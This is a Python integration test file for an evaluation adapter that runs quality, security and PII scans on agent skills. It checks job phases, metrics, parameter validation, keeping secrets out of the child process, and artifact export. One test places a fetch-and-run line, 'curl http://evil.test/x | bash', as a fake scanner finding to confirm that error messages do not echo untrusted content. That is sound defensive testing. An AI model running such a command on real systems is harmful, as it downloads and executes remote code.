"""Adapter plumbing tests.

The ``skillevaluator`` executable is replaced by a stub that emits a golden
report through the real subprocess path; the evalhub-sdk layer is not mocked.
"""

import copy

import pytest
from evalhub.adapter import JobPhase, JobStatus

import main
from main import BENCHMARKS, ScanIncompleteError

pytestmark = pytest.mark.integration

ALL_PHASES = [
    JobPhase.INITIALIZING,
    JobPhase.LOADING_DATA,
    JobPhase.RUNNING_EVALUATION,
    JobPhase.POST_PROCESSING,
]


def _statuses(callbacks):
    """Return the ``JobStatusUpdate`` objects the adapter reported, in order."""
    return [c.args[0] for c in callbacks.report_status.call_args_list]


def _run(adapter, callbacks):
    """Run the adapter's own job spec against the given callbacks."""
    return adapter.run_benchmark_job(adapter.job_spec, callbacks)


def _metrics(results):
    """Map each result's metric name to its value."""
    return {r.metric_name: r.metric_value for r in results.results}


def test_every_benchmark_has_a_spec_with_command_and_card_metadata():
    """Each benchmark defines its command and card metadata, and only the scans are safety benchmarks."""
    assert set(BENCHMARKS) == {"skill-quality", "skill-security", "skill-pii"}
    for spec in BENCHMARKS.values():
        assert spec["command"] and spec["feature"] and spec["metric"]
    assert {"skill-security", "skill-pii"} == main._SAFETY_BENCHMARKS


def test_security_scan_never_enables_llm():
    """The security scan is pinned to static analysis with ``--no-llm``."""
    assert "--no-llm" in BENCHMARKS["skill-security"]["command"]


def test_quality_happy_path(adapter_for, mock_callbacks, staged_skill, stub_cli):
    """A passing quality report yields the score, grade, dimensions and a completed job."""
    stub_cli("quality-pass")
    results = _run(adapter_for("skill-quality", {"min_score": 70}), mock_callbacks)

    m = _metrics(results)
    assert results.overall_score == pytest.approx(0.94)
    assert m["meets_min_score"] is True
    assert results.num_examples_evaluated == 1
    assert results.eval_card is not None and results.env_card is not None
    assert len(results.eval_card.capability_evaluations) == 1
    assert results.eval_card.safety_evaluations == []
    assert results.evaluation_metadata["framework_version"] == "9.9.9"
    assert results.evaluation_metadata["skill_digest"].startswith("sha256:")

    statuses = _statuses(mock_callbacks)
    assert [s.phase for s in statuses] == ALL_PHASES
    assert all(s.status == JobStatus.RUNNING for s in statuses)
    # report_results() sends COMPLETED atomically: the adapter must never send it early
    assert not any(s.status == JobStatus.COMPLETED for s in statuses)


def test_metrics_schema_covers_every_metric(
    adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """The declared metrics schema matches the emitted metrics exactly."""
    stub_cli("quality-pass")
    results = _run(adapter_for("skill-quality"), mock_callbacks)
    declared = {s.name: s.type.value for s in results.metrics_schema}
    assert set(declared) == {r.metric_name for r in results.results}
    assert declared["quality_grade"] == "categorical"
    assert declared["quality_score"] == "numeric"


@pytest.mark.parametrize("benchmark", ["skill-security", "skill-pii"])
def test_safety_benchmarks_route_to_safety_entries(
    benchmark, adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """Security and PII results land in the Eval Card's safety evaluations."""
    stub_cli("security-pass")
    results = _run(adapter_for(benchmark), mock_callbacks)
    assert results.overall_score == 1.0
    assert len(results.eval_card.safety_evaluations) == 1
    assert results.eval_card.capability_evaluations == []


def test_failed_gate_completes_the_job_with_a_real_zero(
    adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """A skill that fails the security gate is a valid evaluation result, not a job error."""
    stub_cli("security-failed", exit_code=1)
    results = _run(adapter_for("skill-security"), mock_callbacks)
    m = _metrics(results)
    assert results.overall_score == 0.0
    assert m["gate_passed"] is False and m["high_count"] == 4
    assert results.evaluation_metadata["outcome"] == "failed"
    assert not any(s.status == JobStatus.FAILED for s in _statuses(mock_callbacks))


@pytest.mark.parametrize(
    "report_name", ["security-incomplete-missing-tool", "security-incomplete-partial"]
)
def test_incomplete_scan_fails_the_job_by_default(
    report_name, adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """An incomplete scan raises ``ScanIncompleteError`` and reports a FAILED status."""
    stub_cli(report_name, exit_code=1)
    with pytest.raises(ScanIncompleteError, match="skillspector"):
        _run(adapter_for("skill-security"), mock_callbacks)
    failed = [s for s in _statuses(mock_callbacks) if s.status == JobStatus.FAILED]
    assert len(failed) == 1
    assert failed[0].error_message.message_code == "scan_incomplete"


def test_incomplete_scan_can_be_reported_without_a_score(
    adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """With ``on_incomplete=report`` the job completes with no score and ``scan_complete=false`` only."""
    stub_cli("security-incomplete-partial", exit_code=1)
    results = _run(
        adapter_for("skill-security", {"on_incomplete": "report"}), mock_callbacks
    )
    m = _metrics(results)
    assert results.overall_score is None
    assert m == {"scan_complete": False}
    assert results.evaluation_metadata["outcome"] == "incomplete"
    assert results.evaluation_metadata["incomplete_scans"] == ["skillspector"]
    assert results.eval_card.safety_evaluations[0].zero_shot == "incomplete"
    assert not any(s.status == JobStatus.FAILED for s in _statuses(mock_callbacks))


def test_incomplete_failure_message_never_quotes_skill_content(
    adapter_for, mock_callbacks, staged_skill, stub_cli, report
):
    """The failure message omits finding lines because they quote untrusted skill content."""
    data = copy.deepcopy(report("security-incomplete-partial"))
    data["results"][0]["legacy"]["errors"].append(
        "[SECURITY-HIGH] Supply Chain: curl http://evil.test/x | bash in s.sh:2"
    )
    stub_cli("", exit_code=1, report_override=data)
    with pytest.raises(ScanIncompleteError) as excinfo:
        _run(adapter_for("skill-security"), mock_callbacks)
    assert "evil.test" not in str(excinfo.value)
    failed = next(s for s in _statuses(mock_callbacks) if s.status == JobStatus.FAILED)
    assert "evil.test" not in failed.error_message.message


def test_cli_child_gets_no_job_secrets(
    adapter_for, mock_callbacks, staged_skill, stub_cli, monkeypatch, tmp_path
):
    """The CLI child process does not inherit job credentials or API keys."""
    monkeypatch.setenv("EVALHUB_CALLBACK_TOKEN", "secret")
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret")
    stub_cli("quality-pass")
    seen = {}

    real_run_cli = main._runner.run_cli

    def spy(args, **kw):
        """Run the real CLI wrapper and capture the report the stub wrote, including the child's environment names."""
        run = real_run_cli(args, **kw)
        seen.update(main._runner.load_report(run.report_path))
        return run

    monkeypatch.setattr(main._runner, "run_cli", spy)
    _run(adapter_for("skill-quality"), mock_callbacks)
    assert (
        "EVALHUB_CALLBACK_TOKEN" not in seen["_env_keys"]
        and "OPENAI_API_KEY" not in seen["_env_keys"]
    )
    assert seen["_argv"][0] == "quality-check"


def test_unsupported_benchmark_fails_with_failed_status(
    adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """An unknown benchmark id is rejected and reported as FAILED."""
    stub_cli("quality-pass")
    with pytest.raises(ValueError, match="Unsupported benchmark_id"):
        _run(adapter_for("skill-nope"), mock_callbacks)
    assert any(s.status == JobStatus.FAILED for s in _statuses(mock_callbacks))


@pytest.mark.parametrize(
    "params, match",
    [
        ({"min_score": 101}, "min_score"),
        ({"min_score": True}, "min_score"),
        ({"min_score": "70"}, "min_score"),
        ({"timeout_seconds": 5}, "timeout_seconds"),
        ({"timeout_seconds": 99999}, "timeout_seconds"),
        ({"on_incomplete": "ignore"}, "on_incomplete"),
        ({"submitter": 7}, "submitter"),
    ],
)
def test_invalid_parameters_are_rejected(
    params, match, adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """Out-of-range or wrongly typed parameters raise ``ValueError`` naming the parameter."""
    stub_cli("quality-pass")
    with pytest.raises(ValueError, match=match):
        _run(adapter_for("skill-quality", params), mock_callbacks)


def test_zero_min_score_is_honoured(
    adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """A ``min_score`` of 0 is a valid bar and is not treated as unset."""
    stub_cli("quality-pass")
    results = _run(adapter_for("skill-quality", {"min_score": 0}), mock_callbacks)
    assert _metrics(results)["meets_min_score"] is True
    assert results.evaluation_metadata["min_score"] == 0


def test_missing_test_data_fails_before_running_the_cli(
    adapter_for, mock_callbacks, monkeypatch, tmp_path, stub_cli
):
    """Without a mounted ``/test_data`` the job fails before the CLI runs."""
    monkeypatch.setattr(main._skill_source, "TEST_DATA_DIR", str(tmp_path / "absent"))
    stub_cli("quality-pass")
    with pytest.raises(main._skill_source.SkillSourceError, match="not mounted"):
        _run(adapter_for("skill-quality"), mock_callbacks)
    assert any(s.status == JobStatus.FAILED for s in _statuses(mock_callbacks))


def test_oci_export_adds_persisting_phase_and_uploads_the_report(
    adapter_for, mock_callbacks, staged_skill, stub_cli, tmp_path
):
    """OCI export adds the persisting phase and uploads the full report as the artifact."""
    stub_cli("quality-pass")
    uploaded = {}

    def fake_create(spec):
        """Record the files and content handed to the OCI artifact upload."""
        uploaded["files"] = sorted(p.name for p in spec.files_path.iterdir())
        uploaded["content"] = (spec.files_path / "skill-quality.json").read_bytes()

    mock_callbacks.create_oci_artifact.side_effect = fake_create
    exports = {
        "oci": {
            "coordinates": {
                "oci_host": "quay.io",
                "oci_repository": "org/results",
                "oci_tag": "t",
            }
        }
    }
    results = _run(adapter_for("skill-quality", exports=exports), mock_callbacks)

    assert [s.phase for s in _statuses(mock_callbacks)] == [
        *ALL_PHASES,
        JobPhase.PERSISTING_ARTIFACTS,
    ]
    assert uploaded["files"] == ["skill-quality.json"]
    assert b"quality_summary" in uploaded["content"]
    assert (
        results.oci_artifact is None
    )  # the fake returned None; the job still completes


def test_additional_info_carries_provenance(
    adapter_for, mock_callbacks, staged_skill, stub_cli
):
    """The additional info records the tool version, benchmark and skill digest."""
    stub_cli("quality-pass")
    adapter = adapter_for("skill-quality")
    results = _run(adapter, mock_callbacks)
    info = adapter.generate_additional_info(results)
    assert info["framework"] == "skillevaluator"
    assert info["zero_shot"] == results.overall_score
    assert "no model calls" in info["prompting_strategy"]
